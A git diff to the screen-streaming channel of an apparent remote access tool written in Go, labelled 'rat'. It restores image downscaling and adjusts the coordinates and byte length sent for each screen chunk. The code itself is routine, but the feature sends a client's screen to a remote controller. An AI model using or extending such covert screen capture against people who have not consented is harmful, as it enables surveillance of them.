@@ -6,6 +6,8 @@ import (
 	"io"
 	"rat/client/screen"
 	"rat/imgdiff"
+
+	"github.com/disintegration/imaging"
 )
 
 type ScreenChannel struct {
@@ -54,24 +56,29 @@ func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
 			case chunk := <-cmp.C:
 				rect := chunk.Rect
 
-				/* if sc.Scale > 0 && sc.Scale < 1.0 {
-					width := float32(chunk.Rect.Dx()) * sc.Scale
-					height := float32(chunk.Rect.Dy()) * sc.Scale
+				x := int32(float32(rect.Min.X) * sc.Scale)
+				y := int32(float32(rect.Min.Y) * sc.Scale)
+				x1 := int32(float32(rect.Max.X) * sc.Scale)
+				y1 := int32(float32(rect.Max.Y) * sc.Scale)
 
-					nrgba := imaging.Resize(chunk, int(width), int(height), imaging.NearestNeighbor)
+				if sc.Scale > 0 && sc.Scale < 1.0 {
+					width := int(float32(chunk.Rect.Dx()) * sc.Scale)
+					height := int(float32(chunk.Rect.Dy()) * sc.Scale)
+
+					nrgba := imaging.Resize(chunk, width, height, imaging.NearestNeighbor)
 					chunk = &image.RGBA{
 						Pix:    nrgba.Pix,
 						Stride: nrgba.Stride,
 						Rect:   nrgba.Rect,
 					}
-				} */
+				}
 
-				binary.Write(channel, binary.LittleEndian, int32(rect.Min.X))
-				binary.Write(channel, binary.LittleEndian, int32(rect.Min.Y))
-				binary.Write(channel, binary.LittleEndian, int32(rect.Max.X))
-				binary.Write(channel, binary.LittleEndian, int32(rect.Max.Y))
+				binary.Write(channel, binary.LittleEndian, x)
+				binary.Write(channel, binary.LittleEndian, y)
+				binary.Write(channel, binary.LittleEndian, x1)
+				binary.Write(channel, binary.LittleEndian, y1)
 
-				binary.Write(channel, binary.LittleEndian, int32(rect.Dx()*rect.Dy()*4))
+				binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Dx()*chunk.Rect.Dy()*4))
 
 				err = imgdiff.Write(channel, chunk)
 
